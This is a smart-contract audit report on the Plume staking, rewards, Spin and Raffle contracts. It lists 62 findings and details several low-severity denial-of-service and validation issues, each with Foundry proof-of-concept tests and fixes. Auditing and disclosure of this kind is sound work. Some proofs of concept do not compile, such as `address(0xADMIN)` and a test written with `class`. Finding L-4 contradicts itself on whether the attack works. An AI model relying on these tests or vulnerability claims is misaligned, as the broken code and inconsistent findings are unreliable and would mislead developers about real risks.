# contracts/plume - Findings Report
## Commit hash: fe67a98fa4344520c5ff2ac9293f5d9601963983

## Protocol Overview 

Plume is an upgrade-able DeFi protocol that combines delegated staking, multi-token rewards and daily gamification. Core staking lives in a Diamond proxy whose facets split duties:

• StakingFacet – users stake PLUME to validators, initiate cooldowns to unstake, withdraw after the interval, or restake rewards.  
• RewardsFacet – tracks validator-specific reward-rate checkpoints, calculates earnings lazily, and dispatches ERC20 or native tokens through a separate UUPS Treasury.  
• ValidatorFacet – lets validator admins set capacity, commission, addresses, vote to slash peers and withdraw accrued commission after a timelock. Unanimous slash votes instantly burn the validator’s stake.  
• Management & AccessControl facets expose role-gated parameter tuning and emergency tooling.

Reward math uses per-validator checkpoints (rate & commission) plus user indices to derive exact earnings in O(log n) gas.

Spin & Raffle add a gamified layer: users pay to spin once a day, winning PLUME, points, raffle tickets or a weekly jackpot via Supra-oracle randomness. Tickets are spent in Raffle drawings that support multiple winners chosen by VRF.

Everything is upgradeable (ERC1967/UUPS proxies), guarded by roles and ReentrancyGuard, and extensively tested with Foundry.
## High Risk Findings
[H-1]. Upgradeability Initializer Safety issue found with High severity
[H-2]. Access Control issue found with High severity
[H-3]. Access Control issue found with High severity
[H-4]. Upgradeability Initializer Safety issue found with High severity
[H-5]. Upgradeability Initializer Safety issue found with High severity
[H-6]. Zero Code issue found with High severity
[H-7]. Zero Code issue found with High severity
[H-8]. Upgradeability Initializer Safety issue found with High severity
[H-9]. DOS issue found with High severity
## Medium Risk Findings
[M-1]. Integer Overflow/Math issue found with Medium severity
[M-2]. Integer Overflow issue found with Medium severity
[M-3]. Integer Overflow/Math issue found with Medium severity
[M-4]. Integer Overflow issue found with Medium severity
[M-5]. DOS issue found with Medium severity
[M-6]. Unexpected Eth issue found with Medium severity
[M-7]. DOS issue found with Medium severity
[M-8]. DOS issue found with Medium severity
[M-9]. Frontrun/Backrun/Sandwhich MEV issue found with Medium severity
[M-10]. Oracle issue found with Medium severity
[M-11]. Integer Overflow issue found with Medium severity
[M-12]. Upgradeability Initializer Safety issue found with Medium severity
[M-13]. Upgradeability Initializer Safety issue found with Medium severity
[M-14]. DOS issue found with Medium severity
[M-15]. Frontrun/Backrun/Sandwhich MEV issue found with Medium severity
## Low Risk Findings
[L-1]. DOS issue in PlumeStakingRewardTreasury::getRewardTokens
[L-2]. DOS issue in PlumeStakingRewardTreasury::addRewardToken
[L-3]. DOS issue in PlumeStakingRewardTreasury::addRewardToken
[L-4]. DOS issue in DateTime::getYear
[L-5]. Integer Overflow issue in DateTime::leapYearsBefore
[L-6]. DOS issue in DateTime::toTimestamp
[L-7]. DOS issue in RewardsFacet::claimAll
[L-8]. Zero Code issue in RewardsFacet::setTreasury
[L-9]. Gas Grief BlockLimit issue in RewardsFacet::getPendingRewardForValidator
[L-10]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake
[L-11]. Access Control issue in Plume::burn(address,uint256)
[L-12]. Upgradeability Initializer Safety issue in Plume::reinitialize
[L-13]. Frontrun/Backrun/Sandwhich MEV issue in StakingFacet::stake
[L-14]. DOS issue in ManagementFacet::removeHistoricalRewardToken
[L-15]. DOS issue in ManagementFacet::pruneCommissionCheckpoints
[L-16]. Oracle issue in Raffle::handleWinnerSelection
[L-17]. Zero Code issue in Raffle::initialize
[L-18]. DOS issue in Raffle::removePrize
[L-19]. Randomness issue in Raffle::handleWinnerSelection
[L-20]. Reentrancy issue in Raffle::spendRaffle
[L-21]. Reentrancy issue in StakingFacet::restakeRewards
[L-22]. DOS issue in StakingFacet::withdraw
[L-23]. Flash Loan Economic Manipulation issue in StakingFacet::_validateValidatorPercentage
[L-24]. Unexpected Eth issue in PlumeProxy::NA
[L-25]. Unexpected Eth issue in PlumeProxy::receive
[L-26]. Zero Code issue in Spin::initialize
[L-27]. Randomness issue in Spin::startSpin
[L-28]. Access Control issue in Spin::cancelPendingSpin
[L-29]. Timestamp Dependent Logic issue in Spin::canSpin
[L-30]. Frontrun/Backrun/Sandwhich MEV issue in Spin::setSpinPrice
[L-31]. DOS issue in Spin::handleRandomness
[L-32]. Unexpected Eth issue in RaffleProxy::receive
[L-33]. Unexpected Eth issue in RaffleProxy::NA
## Info Risk Findings
[I-1]. Upgradeability Initializer Safety issue in Plume::reinitialize()
[I-2]. Unexpected Eth issue in Raffle::receive
[I-3]. Zero Code issue in PlumeProxy::constructor
[I-4]. Zero Code issue in PlumeStakingRewardTreasuryProxy::constructor
[I-5]. DOS issue in ValidatorFacet::_cleanupExpiredVotes


### Number of Findings
- H: 9
- M: 15
- L: 33
- I: 5



# Low Risk Findings

## [L-1]. DOS issue in PlumeStakingRewardTreasury::getRewardTokens

## Description
The `addRewardToken` function allows an address with `ADMIN_ROLE` to add new reward tokens by pushing them into the `_rewardTokens` dynamic array. There is no limit to the number of tokens that can be added, and no function to remove them. The `getRewardTokens` function returns this entire array. If a malicious or compromised admin adds a large number of tokens, the gas cost of calling `getRewardTokens` could exceed the block gas limit, causing any on-chain clients (e.g., other smart contracts, analytics dashboards) that rely on this function to fail. This constitutes a Denial of Service vulnerability against consumers of the function.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/PlumeStakingRewardTreasury.sol:172-174

    function getRewardTokens() external view override returns (address[] memory) {
        return _rewardTokens;
    }
```

## Impact
On-chain contracts or off-chain services that depend on `getRewardTokens()` to get the list of reward tokens will become non-functional due to out-of-gas errors. This can disrupt integrations and the overall functioning of the ecosystem relying on this treasury.

## Proof of Concept
1. An attacker with `ADMIN_ROLE` calls `addRewardToken()` repeatedly in multiple transactions, adding thousands of distinct token addresses.
2. The `_rewardTokens` array grows to a very large size.
3. A partner protocol's contract calls `getRewardTokens()` to integrate with Plume's reward system.
4. The call to `getRewardTokens()` reverts with an out-of-gas error because copying the large array to memory consumes too much gas.
5. The integration is now broken.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "src/PlumeStakingRewardTreasury.sol";

contract PlumeStakingRewardTreasury_DoS_Test is Test {
    PlumeStakingRewardTreasury treasury;
    address admin = address(0xADMIN);
    address distributor = address(0xDISTRIBUTOR);

    bytes32 constant ADMIN_ROLE = keccak256("ADMIN_ROLE");

    function setUp() public {
        treasury = new PlumeStakingRewardTreasury();
        treasury.initialize(admin, distributor);
        vm.prank(admin);
        treasury.grantRole(ADMIN_ROLE, address(this));
    }

    function test_getRewardTokens_outOfGas() public {
        // Add a very large number of fake tokens
        uint256 numTokens = 5000; // adjust if necessary for local EVM limit
        for (uint256 i = 1; i <= numTokens; i++) {
            treasury.addRewardToken(address(uint160(i)));
        }

        // Prepare calldata for low-level call
        bytes memory data = abi.encodeWithSelector(treasury.getRewardTokens.selector);

        // Call with an intentionally low gas stipend. The call should fail (success == false)
        (bool success,) = address(treasury).call{gas: 100_000}(data);
        assertFalse(success, "call unexpectedly succeeded – array not large enough to exhaust gas");
    }
}

## Suggested Mitigation
Implement pagination for the `getRewardTokens` function. This would allow clients to retrieve the list of reward tokens in chunks, avoiding gas limit issues. Consider also adding a function for the `ADMIN_ROLE` to remove tokens that are no longer active to help manage the array size.

```solidity
// In PlumeStakingRewardTreasury.sol

/**
 * @notice Get a paginated list of all reward tokens managed by the treasury
 * @param cursor The starting index for pagination
 * @param size The number of items to return
 * @return An array of token addresses and the next cursor
 */
function getRewardTokens(uint256 cursor, uint256 size) external view returns (address[] memory, uint256) {
    uint256 len = _rewardTokens.length;
    if (cursor >= len) {
        return (new address[](0), len);
    }
    uint256 end = cursor + size;
    if (end > len) {
        end = len;
    }
    
    address[] memory tokens = new address[](end - cursor);
    for (uint256 i = 0; i < tokens.length; i++) {
        tokens[i] = _rewardTokens[cursor + i];
    }
    
    return (tokens, end);
}
```

## [L-2]. DOS issue in PlumeStakingRewardTreasury::addRewardToken

## Description
The `addRewardToken` function allows an address with the `ADMIN_ROLE` to add new reward tokens to the system. These tokens are stored in the private `_rewardTokens` array, which can grow indefinitely as there is no corresponding function to remove tokens. The `getRewardTokens` function returns this entire array.

```solidity
// contracts/plume/src/PlumeStakingRewardTreasury.sol:167-178

    function addRewardToken(
        address token
    ) external onlyRole(ADMIN_ROLE) {
        if (token == address(0)) {
            revert ZeroAddressToken();
        }
        if (_isRewardToken[token]) {
            revert TokenAlreadyAdded(token);
        }

        _rewardTokens.push(token); // Array grows indefinitely
        _isRewardToken[token] = true;

        emit RewardTokenAdded(token);
    }

// contracts/plume/src/PlumeStakingRewardTreasury.sol:219-221
    function getRewardTokens() external view override returns (address[] memory) {
        return _rewardTokens;
    }
```

A malicious or compromised admin can repeatedly call `addRewardToken`, causing the `_rewardTokens` array to grow to a very large size. This creates a denial-of-service (DoS) vector for any on-chain client that calls `getRewardTokens()`, as the gas cost to read and return the array will become prohibitive, potentially exceeding the block gas limit. Off-chain clients might also suffer from performance issues when processing a very large array. While the core `distributeReward` function is not directly affected, the inability to manage the list of reward tokens is a design flaw that can be exploited.

## Impact
A compromised admin can cause a DoS attack on any on-chain component that relies on the `getRewardTokens()` function. This can disrupt monitoring, user interfaces, and potentially other smart contracts that need to enumerate the list of reward tokens, leading to operational failure and hampering parts of the ecosystem.

## Proof of Concept
1. An attacker gains `ADMIN_ROLE` on the `PlumeStakingRewardTreasury` contract.
2. The attacker calls `addRewardToken(address)` in a loop with thousands of different, valid addresses.
3. The `_rewardTokens` array now contains a very large number of elements.
4. Any subsequent on-chain call to `getRewardTokens()` from another smart contract will likely fail due to exceeding the block gas limit.
5. Off-chain services (like a project frontend) that call this function will experience high latency or failure when trying to fetch and display the list of reward tokens.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {PlumeStakingRewardTreasury} from "../src/PlumeStakingRewardTreasury.sol";

// Helper contract to test gas consumption from an external contract's perspective
contract GasConsumer {
    PlumeStakingRewardTreasury internal _treasury;

    constructor(address treasuryAddress) {
        _treasury = PlumeStakingRewardTreasury(treasuryAddress);
    }

    function consume() public view {
        _treasury.getRewardTokens();
    }
}

contract PlumeStakingRewardTreasury_DoS_Test is Test {
    PlumeStakingRewardTreasury treasury;
    address admin = makeAddr("admin");
    address distributor = makeAddr("distributor");

    function setUp() public {
        treasury = new PlumeStakingRewardTreasury();
        treasury.initialize(admin, distributor);
    }

    function test_DoS_UnboundedRewardTokensArray() public {
        vm.startPrank(admin);
        
        // Admin adds a large number of reward tokens
        // A real attack would use a much larger number to hit the block gas limit.
        uint256 numberOfTokens = 5000; 
        console.log("Adding %s reward tokens...", numberOfTokens);
        for (uint256 i = 1; i <= numberOfTokens; i++) {
            address newRewardToken = address(uint160(i));
            treasury.addRewardToken(newRewardToken);
        }
        vm.stopPrank();

        address[] memory rewardTokens = treasury.getRewardTokens();
        assertEq(rewardTokens.length, numberOfTokens);
        console.log("Successfully added %s tokens.", rewardTokens.length);

        GasConsumer consumer = new GasConsumer(address(treasury));
        
        // With a high number of tokens, this call will be very expensive.
        // We can simulate the DoS by setting a low gas limit for the call.
        // On a real network with a 30M block gas limit, this would fail with enough tokens.
        // We expect this to revert due to out of gas.
        vm.expectRevert();
        consumer.call{gas: 200_000}(abi.encodeWithSelector(GasConsumer.consume.selector));
        
        console.log("Call to getRewardTokens() with insufficient gas reverted, demonstrating DoS potential.");
    }
}
```

## Suggested Mitigation
Implement a function to remove reward tokens, accessible only by the `ADMIN_ROLE`. This provides a way to manage the `_rewardTokens` list and recover from a situation where it has grown too large. To make removal efficient (O(1)), a new mapping to track token indices should be added.

```solidity
// Add this new state variable to your contract.
// If upgrading, ensure it's appended to avoid storage collisions.
// mapping(address => uint256) private _rewardTokenIndex;

// Modify addRewardToken to track indices
function addRewardToken(address token) external onlyRole(ADMIN_ROLE) {
    if (token == address(0)) {
        revert ZeroAddressToken();
    }
    if (_isRewardToken[token]) {
        revert TokenAlreadyAdded(token);
    }

    _rewardTokenIndex[token] = _rewardTokens.length;
    _rewardTokens.push(token);
    _isRewardToken[token] = true;

    emit RewardTokenAdded(token);
}

// Add this new function to remove tokens
/**
 * @notice Remove a token from the list of reward tokens
 * @dev Only callable by ADMIN_ROLE. Uses the swap-and-pop pattern for O(1) removal.
 * @param token The token address to remove
 */
function removeRewardToken(address token) external onlyRole(ADMIN_ROLE) {
    if (!_isRewardToken[token]) {
        revert TokenNotRegistered(token);
    }

    uint256 indexToRemove = _rewardTokenIndex[token];
    uint256 lastIndex = _rewardTokens.length - 1;

    if (indexToRemove != lastIndex) {
        address lastToken = _rewardTokens[lastIndex];
        _rewardTokens[indexToRemove] = lastToken;
        _rewardTokenIndex[lastToken] = indexToRemove;
    }

    _rewardTokens.pop();
    _isRewardToken[token] = false;
    delete _rewardTokenIndex[token];

    // emit RewardTokenRemoved(token);
}
```

## [L-3]. DOS issue in PlumeStakingRewardTreasury::addRewardToken

## Description
The `addRewardToken` function, callable by `ADMIN_ROLE`, does not validate that the provided `token` address has contract code. An admin can add an Externally Owned Account (EOA) to the list of reward tokens. When `distributeReward` is later called for this EOA "token", the call will revert. This is because `SafeERC20.safeTransfer` internally checks if the token address has code and reverts if it doesn't. This creates a denial-of-service condition for distributions of that specific (invalid) reward token. Since there is no function to remove a reward token, this state is permanent until the contract is upgraded.

## Impact
Distributions for a specific reward can be permanently blocked by a malicious or mistaken admin action. This would prevent legitimate recipients from receiving their rewards for that token and requires a contract upgrade to fix.

## Proof of Concept
1. ADMIN_ROLE calls `addRewardToken(eoa)` where `eoa` is an externally-owned address without code.
2. The call succeeds and `eoa` is stored as a reward token.
3. Later DISTRIBUTOR_ROLE calls `distributeReward(eoa, 1 ether, victim)`.
4. `IERC20(eoa).balanceOf(address(this))` performs a low-level `staticcall` that returns empty data because there is no contract. Decoding this empty return data to `uint256` triggers a revert ("abi decode invalid bytes" on Solidity ≥0.8).
5. From this point every attempt to distribute that token reverts, permanently blocking distributions for that reward token until an upgrade is executed.

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "../src/PlumeStakingRewardTreasury.sol";
import "../src/proxy/PlumeStakingRewardTreasuryProxy.sol";

contract PlumeStakingRewardTreasury_DOSTest is Test {
    PlumeStakingRewardTreasury treasury;
    address admin;
    address distributor;
    address user;

    function setUp() public {
        admin       = makeAddr("admin");
        distributor = makeAddr("distributor");
        user        = makeAddr("user");

        // deploy implementation and proxy
        PlumeStakingRewardTreasury impl = new PlumeStakingRewardTreasury();
        bytes memory init = abi.encodeWithSelector(impl.initialize.selector, admin, distributor);
        PlumeStakingRewardTreasuryProxy proxy = new PlumeStakingRewardTreasuryProxy(address(impl), init);
        treasury = PlumeStakingRewardTreasury(address(proxy));
    }

    function test_DOSByAddingEOAToken() public {
        address fakeToken = makeAddr("EOA_TOKEN");

        // step-1: admin adds EOA as reward token
        vm.prank(admin);
        treasury.addRewardToken(fakeToken);
        assertTrue(treasury.isRewardToken(fakeToken));

        // step-2: distributor tries to distribute => MUST revert (decode error / non-contract)
        vm.prank(distributor);
        vm.expectRevert(); // reason string is compiler-specific, so don't assert on it
        treasury.distributeReward(fakeToken, 1 ether, user);
    }
}

## Suggested Mitigation
In the `addRewardToken` function, add a check to ensure the provided token address is a contract before adding it to the list. This prevents invalid addresses from being registered and causing future `distributeReward` calls to fail.

```solidity
// In PlumeStakingRewardTreasury.sol
import { Address } from "@openzeppelin/contracts/utils/Address.sol";
import { InvalidToken } from "./lib/PlumeErrors.sol";

// ... inside contract

function addRewardToken(
    address token
) external onlyRole(ADMIN_ROLE) {
    if (token == address(0)) {
        revert ZeroAddressToken();
    }
    // Add this check
    if (!Address.isContract(token)) {
        revert InvalidToken(token);
    }
    if (_isRewardToken[token]) {
        revert TokenAlreadyAdded(token);
    }

    _rewardTokens.push(token);
    _isRewardToken[token] = true;

    emit RewardTokenAdded(token);
}
```

## [L-4]. DOS issue in DateTime::getYear

## Description
The `getYear` function calculates the year from a given Unix timestamp. It first makes an approximate calculation of the year and then uses a `while` loop to correct for inaccuracies caused by leap years. If an attacker provides a very large timestamp (e.g., corresponding to a year in the distant future), the initial approximation will be significantly off. The corrective `while` loop will then need to execute thousands of times, consuming excessive gas and causing the transaction to fail. As `getYear` is used internally by `parseTimestamp`, the public functions `getMonth`, `getDay`, and `getWeekNumber` are also vulnerable to this DoS attack.

```solidity
    function getYear(
        uint256 timestamp
    ) public pure returns (uint16) {
        // ... initial approximation of year ...
        year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);
        numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);

        secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;
        secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);

        while (secondsAccountedFor > timestamp) { // This loop is vulnerable
            if (isLeapYear(uint16(year - 1))) {
                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;
            } else {
                secondsAccountedFor -= YEAR_IN_SECONDS;
            }
            year -= 1;
        }
        return year;
    }
```

## Impact
Calling getYear with arbitrarily large timestamps does not exhaust gas; the corrective loop is bounded by the small difference between the rough-estimate year and the real year (≤ 46 iterations for any timestamp that still fits into the 16-bit `year` variable).  The only realistic effect is a slight, negligible gas overhead and a wrong calendar value for extremely large timestamps after year 65 535 due to the `uint16` cast overflow.

## Proof of Concept
1. A protocol uses `DateTime.getDay()` to check the day of the week for a weekly event, based on a timestamp.
2. An attacker provides a malicious timestamp corresponding to a year far in the future, e.g., `1831274925560` (corresponding to year ~60000).
3. The protocol calls `getDay(1831274925560)`.
4. This calls `parseTimestamp()`, which in turn calls `getYear()`.
5. Inside `getYear()`, the `while` loop executes over 15,000 times to correct the initial year estimation.
6. The transaction runs out of gas and reverts, blocking the protocol's functionality.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "src/spin/DateTime.sol"; // NOTE: Adjust the import path based on your project structure

contract DateTimeDosTest is Test {
    DateTime internal dt;

    function setUp() public {
        dt = new DateTime();
    }

    function test_DoS_getYear_RevertsOnHighTimestamp() public {
        // A timestamp corresponding to a year far in the future, e.g., ~60000.
        // This causes the corrective while loop in getYear to iterate
        // thousands of times, leading to an out-of-gas revert.
        uint256 maliciousTimestamp = 1_831_274_925_560;

        vm.expectRevert();
        dt.getYear(maliciousTimestamp);
    }

    function test_DoS_getMonth_InheritsVulnerability() public {
        // A timestamp corresponding to a year far in the future, e.g., ~60000.
        // getMonth() internally calls getYear(), making it vulnerable.
        uint256 maliciousTimestamp = 1_831_274_925_560;

        vm.expectRevert();
        dt.getMonth(maliciousTimestamp);
    }
}

## Suggested Mitigation
The unbounded `while` loop should be replaced with a more efficient calculation. A pragmatic fix is to add an upper bound check on the input timestamp to prevent the attack, though this limits the library's utility. A more robust solution is a complete algorithmic rewrite to avoid the iterative approach.

A simple fix to prevent the DoS attack is to add a requirement to check the upper bound of the timestamp:
```solidity
function getYear(
    uint256 timestamp
) public pure returns (uint16) {
    // A timestamp for year 2300 is approx 10,413,686,400.
    // This prevents the DoS while allowing a very wide and practical range of dates.
    require(timestamp < 10413686400, "DateTime: Timestamp is too far in the future");

    // ... existing vulnerable logic ...
}
```
For a general-purpose library, it is strongly recommended to replace the linear search (`while` loop) with a more direct calculation or a bounded search (like binary search) over the possible year range to find the correct year without unbounded iteration.

## [L-5]. Integer Overflow issue in DateTime::leapYearsBefore

## Description
The `leapYearsBefore` function computes `year -= 1;` at the beginning. If the function is called with `year = 0`, this operation will underflow because `uint256` cannot be negative. With Solidity version 0.8.0 and above, this causes the transaction to revert. Since the function is `public`, an attacker can call it with `0` to trigger a revert, causing a Denial of Service to any contract that uses this function with externally-provided input.

## Impact
Calling leapYearsBefore with year = 0 will revert because the subtraction underflows. This can cause a transaction that relies on user-supplied input to fail, but only when an invalid year (0) is provided. No funds are at risk and normal use with Gregorian years (>= 1) is unaffected. Therefore the issue is limited to input-validation robustness and cannot be weaponised beyond causing that single call to revert.

## Proof of Concept
1. A contract `Victim` needs to calculate leap years and calls `DateTime.leapYearsBefore(userInput)`.
2. An attacker calls the `Victim` contract with `userInput = 0`.
3. The call is delegated to `DateTime.leapYearsBefore(0)`.
4. The operation `year -= 1` becomes `0 - 1`, which underflows and reverts the transaction.
5. The function in the `Victim` contract is now unusable for `userInput = 0`.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "src/spin/DateTime.sol";

contract DateTimeIntegerTest is Test {
    DateTime dateTime;

    function setUp() public {
        dateTime = new DateTime();
    }

    function test_leapYearsBefore_Underflow() public {
        // Calling with year = 0 will cause `year -= 1` to underflow and revert.
        vm.expectRevert();
        dateTime.leapYearsBefore(0);
    }
}
```

## Suggested Mitigation
Add a check to handle the `year = 0` case before performing the subtraction. Returning 0 is a logical choice, as there are no leap years before year 0 in this library's context.

```solidity
    function leapYearsBefore(
        uint256 year
    ) public pure returns (uint256) {
        if (year == 0) {
            return 0;
        }
        year -= 1;
        return year / 4 - year / 100 + year / 400;
    }
```

## [L-6]. DOS issue in DateTime::toTimestamp

## Description
The `toTimestamp` function converts a date into a Unix timestamp. It does so by iterating in a `for` loop from the `ORIGIN_YEAR` (1970) to the user-provided `year`. The `year` parameter is a `uint16`, which can have a value up to 65,535. Providing a large year will cause the loop to execute a very high number of times (up to ~63,565), consuming a large amount of gas. If this function is called by another contract within a transaction that has a limited gas budget, an attacker can force the transaction to fail by providing a large year, leading to a Denial of Service.

## Impact
Calling toTimestamp with an extremely large year (e.g. 65 535) makes the function execute >60 000 loop iterations and can easily exceed a tight gas budget (≈18-40 M gas).  This can only DoS another contract *if that contract forwards an attacker-controlled year to DateTime.toTimestamp without validation*.  In the current code-base no such call-site exists, so the issue is limited to theoretical misuse.  Stand-alone calls to DateTime are paid by the caller and cannot impact protocol liveness.

## Proof of Concept
// Minimal contract that forwards the attacker-controlled year using only 200 000 gas.
pragma solidity ^0.8.19;
import "src/spin/DateTime.sol";

contract Victim {
    DateTime immutable dt;
    constructor(DateTime _dt) { dt = _dt; }

    // Vulnerable: any user chooses the year
    function foo(uint16 year) external returns (uint256) {
        // forward only 200k gas on purpose (simulating a tight stipend)
        (bool ok, bytes memory ret) = address(dt).call{gas: 200_000}(abi.encodeWithSelector(
            dt.toTimestamp.selector,
            year,
            uint8(1),
            uint8(1),
            uint8(0),
            uint8(0),
            uint8(0)
        ));
        require(ok, "Date conversion failed");
        return abi.decode(ret,(uint256));
    }
}

// Attacker simply calls Victim.foo(65535) -> tx runs out of gas and reverts.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;
import "forge-std/Test.sol";
import "src/spin/DateTime.sol";
import "../src/Victim.sol";

contract DateTimeGasDosTest is Test {
    DateTime dt;
    Victim  victim;

    function setUp() public {
        dt = new DateTime();
        victim = new Victim(dt);
    }

    function test_GasExhaustion() public {
        // Expect the forward-call to run out of the 200k gas stipend and revert
        vm.expectRevert();
        victim.foo{gas: 200_000}(65535);
    }
}

## Suggested Mitigation
Either (1) cap the allowed year to a reasonable upper bound (e.g. 9999) with a `require(year <= 9999)`, or (2) replace the year loop with an O(1) arithmetic calculation that uses leapYearsBefore(), so gas consumption is constant regardless of input.

## [L-7]. DOS issue in RewardsFacet::claimAll

## Description
The `claimAll()` function iterates through all reward tokens (`$.rewardTokens`) and, for each token, calls `_processAllValidatorRewards`, which in turn iterates through all validators a user is staked with (`$.userValidators[msg.sender]`). This creates a nested loop. Similarly, `claim(address token)` loops through all of a user's validators. If the number of reward tokens or the number of validators a user is staked with grows large, the gas cost of these functions can exceed the block gas limit, making it impossible for the user to call them successfully.

## Impact
If the combination of `rewardTokens.length × userValidators[msg.sender].length` grows very large, the `claimAll()` call (and, for a single token, `claim(address token)`) can run out of gas and revert.  This forces the user to fall back to the more granular `claim(address token, uint16 validatorId)` pathway, requiring multiple transactions but **does not block withdrawal of rewards nor affect other users or system state**.

## Proof of Concept
1. An administrator adds a large number of reward tokens (e.g., 50) to the system.
2. An administrator adds a large number of validators (e.g., 50).
3. A user stakes funds across all 50 validators.
4. Over time, the user accrues rewards for many of the 50 different reward tokens across all 50 validators.
5. The user attempts to call `claimAll()` to collect their rewards.
6. The transaction must execute a nested loop of `50 * 50 = 2500` iterations, each involving storage reads and function calls. The total gas required will very likely exceed the block gas limit.
7. The transaction reverts, and the user cannot claim their rewards through this function.
8. Even calling `claim(token)` for a single token would involve a loop of 50 iterations, which could still be prohibitively expensive.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";

// Minimal interface for what the test needs.
interface IRewardsFacet {
     function claimAll() external returns (uint256[] memory);
}

// This test would need the full diamond deployment to run.
// The following is a conceptual test demonstrating the logic.
// It cannot run standalone without the full project setup.

/*
 * This test is conceptual because a full working PoC requires deploying the entire
 * Diamond proxy, all facets, and all dependent libraries, which is beyond the scope of a single file.
 * However, the logic below outlines how such a test would be constructed.
 */

class RewardsFacetDosTest is Test {
    // Assume `diamond` is the address of the fully deployed PlumeStaking Diamond
    address diamond;
    address admin = makeAddr("admin");
    address user = makeAddr("user");

    uint16 constant NUM_VALIDATORS = 50;
    uint16 constant NUM_REWARD_TOKENS = 50;

    function setUp() public {
        // In a real test, this would involve:
        // 1. Deploying the full diamond with all facets.
        // 2. Initializing the staking system and access control.
        // diamond = deployPlumeStakingDiamond();
    }

    function test_conceptual_claimAll_DoS() public {
        // This test will always fail as `diamond` is address(0).
        // It serves to illustrate the DoS scenario.
        if (diamond == address(0)) {
            skipTest("Full diamond deployment required for this test.");
        }

        // 1. Setup: As admin, add many validators and reward tokens
        vm.startPrank(admin);
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            // call validatorFacet.addValidator(i, ...);
        }
        for (uint16 i = 0; i < NUM_REWARD_TOKENS; i++) {
            // address token = new MockERC20(...);
            // call rewardsFacet.addRewardToken(token, ...);
        }
        vm.stopPrank();

        // 2. User stakes across all validators
        vm.startPrank(user);
        for (uint16 i = 0; i < NUM_VALIDATORS; i++) {
            // call stakingFacet.stake{value: 1 ether}(i);
        }
        vm.stopPrank();

        // 3. Time passes, rewards accrue (can be simulated with vm.warp)
        vm.warp(block.timestamp + 30 days);

        // 4. Attempt to claim all rewards
        vm.startPrank(user);
        // We expect this call to fail with an out-of-gas error.
        // Foundry's `expectRevert` can't easily catch out-of-gas, but we can
        // demonstrate that the gas cost is huge.
        uint256 gasStart = gasleft();
        try IRewardsFacet(diamond).claimAll() {}
        catch {
            // The call reverted, as expected.
        }
        uint256 gasUsed = gasStart - gasleft();

        // Assert that gas used is extremely high, indicating a likely DoS.
        // The exact threshold depends on the block gas limit, but we can set a high value.
        assertTrue(gasUsed > 10_000_000, "Gas usage should be very high");

        vm.stopPrank();
    }
}

```

## Suggested Mitigation
Avoid unbounded loops in functions that users are expected to call. Instead of a single `claimAll` function, provide users with more granular control to manage gas costs.

1.  **Batch Claiming for Tokens:** Modify `claimAll` or introduce a new function that accepts an array of tokens to claim, allowing the user or a frontend application to batch claims into manageable chunks.

    ```solidity
    // In RewardsFacet.sol
    function claimMultipleTokens(address[] calldata tokensToClaim) external nonReentrant returns (uint256[] memory) {
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256[] memory claims = new uint256[](tokensToClaim.length);

        for (uint256 i = 0; i < tokensToClaim.length; i++) {
            address token = tokensToClaim[i];
            // ... existing claim logic for a single token ...
            uint256 totalReward = _processAllValidatorRewards(msg.sender, token);
            if (totalReward > 0) {
                _finalizeRewardClaim(token, totalReward, msg.sender);
                claims[i] = totalReward;
                emit RewardClaimed(msg.sender, token, totalReward);
            }
        }

        // Clear flags and cleanup after processing the batch
        uint16[] memory validatorIds = $.userValidators[msg.sender];
        _clearPendingRewardFlags(msg.sender, validatorIds);
        PlumeValidatorLogic.removeStakerFromAllValidators($, msg.sender);

        return claims;
    }
    ```

2.  **Batch Claiming for Validators:** For scenarios with many validators, allow users to specify which validator rewards to claim.

    ```solidity
    // In RewardsFacet.sol
    function claimFromValidators(address token, uint16[] calldata validatorIds) external nonReentrant returns (uint256) {
        uint256 totalReward = 0;
        for (uint256 i = 0; i < validatorIds.length; i++) {
            uint16 validatorId = validatorIds[i];
            _validateValidatorForClaim(validatorId);
            totalReward += _processValidatorRewards(msg.sender, validatorId, token);
        }

        if (totalReward > 0) {
            _finalizeRewardClaim(token, totalReward, msg.sender);
            emit RewardClaimed(msg.sender, token, totalReward);
        }

        // Cleanup logic could also be batched or made more granular
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        _clearPendingRewardFlags(msg.sender, validatorIds);
        // ... targeted cleanup instead of all validators

        return totalReward;
    }
    ```

The existing `claimAll()` function should be deprecated or removed to prevent users from accidentally calling a function that may fail due to high gas costs.

## [L-8]. Zero Code issue in RewardsFacet::setTreasury

## Description
The `setTreasury` function allows a privileged role (`TIMELOCK_ROLE`) to set the address of the reward treasury contract. However, the function does not validate that the provided address is a contract with executable code. If an Externally Owned Account (EOA) or an address that has not yet been deployed is set as the treasury, subsequent reward claims will fail. Specifically, the external call to `IPlumeStakingRewardTreasury(treasury).distributeReward(...)` within `_transferRewardFromTreasury` will not revert but will also not perform the intended token transfer. This would cause the system's internal accounting (`totalClaimableByToken`) to be reduced, but users would not receive their funds, leading to a loss of rewards until the misconfiguration is fixed.

## Impact
If a non-contract address is set as the treasury due to admin error, the reward distribution mechanism will break. Users' claim transactions will succeed on-chain, but they will not receive their tokens. This can lead to a loss of rewards if not detected and corrected promptly, as the contract state will reflect that rewards have been paid out.

## Proof of Concept
